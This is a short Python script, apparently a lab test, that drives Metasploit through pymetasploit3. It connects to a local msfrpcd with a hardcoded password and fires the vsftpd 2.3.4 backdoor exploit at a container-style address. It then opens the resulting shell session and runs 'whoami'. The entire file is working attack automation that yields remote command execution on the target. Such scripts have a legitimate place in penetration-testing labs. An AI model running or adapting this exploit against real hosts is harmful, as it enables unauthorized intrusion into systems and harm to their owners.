import time
from pymetasploit3.msfrpc import MsfRpcClient

def test_existing_msf():
    print("[*] Connecting to msfrpcd on 127.0.0.1:55553...")
    client = MsfRpcClient("hercules123", server="127.0.0.1", port=55553, ssl=False)
    print("[+] Connected!")
    
    target_ip = "172.17.0.2"
    print(f"[*] Running exploit against {target_ip}...")
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 21
    
    job = exploit.execute(payload='cmd/unix/interact')
    print(f"[*] Exploit executed, job ID: {job['job_id']}")
    
    print("[*] Waiting 10 seconds for session...")
    time.sleep(10)
    
    sessions = client.sessions.list
    if not sessions:
        print("[-] No sessions found!")
    else:
        print(f"[+] Active sessions: {sessions}")
        for session_id in sessions.keys():
            print(f"[*] Interacting with session {session_id}...")
            shell = client.sessions.session(str(session_id))
            shell.write('whoami\n')
            time.sleep(2)
            out = shell.read()
            print(f"[+] whoami Output: {out}")
            
if __name__ == "__main__":
    test_existing_msf()
